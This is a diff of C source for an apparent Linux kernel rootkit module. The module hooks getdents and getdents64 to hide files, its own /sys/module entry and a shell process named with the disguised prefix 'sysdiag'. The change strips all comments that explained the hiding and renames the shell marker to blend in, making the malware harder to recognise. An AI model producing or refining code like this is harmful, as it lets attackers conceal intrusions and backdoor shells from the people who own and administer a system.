@@ -11,10 +11,8 @@ struct linux_dirent {
     char           d_name[];
 };
 
-#define PREFIX "sysdiag"     /* hide anything starting with this        */
-#define MARKER "sysdiag_sh"  /* comm of our shell (auto-hidden in /proc) */
-
-
+#define PREFIX "sysdiag"    
+#define MARKER "sysdiag"    
 static asmlinkage long (*og_getdents)(unsigned int fd,
         struct linux_dirent __user *dirent, unsigned int count);
 
@@ -29,16 +27,7 @@ static bool is_numeric(const char *s)
     return true;
 }
 
-/*
- * Shared filter for getdents and getdents64.
- * The original syscall already filled the user buffer with a list of
- * directory entries. We copy it in, "skip" unwanted entries by extending
- * the PREVIOUS entry's d_reclen over them (the entry is never copied
- * back, but the list stays valid), then copy the shrunk list out.
- *
- * Hides: (1) names starting with PREFIX  -> files, dirs, /sys/module/sysdiag
- *        (2) /proc/<pid> whose task comm == MARKER -> our shell process
- */
+
 static long filter_dirents(void __user *udirent, long ret, bool is64)
 {
     char *kbuf, *cur, *prev = NULL;
@@ -92,13 +81,10 @@ static long filter_dirents(void __user *udirent, long ret, bool is64)
 
         if (hide) {
             if (cur == kbuf) {
-                /* first entry: slide whole list left over it, then
-                 * re-examine the NEW first entry without advancing */
                 ret -= reclen;
                 memmove(cur, cur + reclen, ret);
                 continue;
             }
-            /* middle/last entry: stretch previous entry over this one */
             if (is64)
                 ((struct linux_dirent64 *)prev)->d_reclen += reclen;
             else
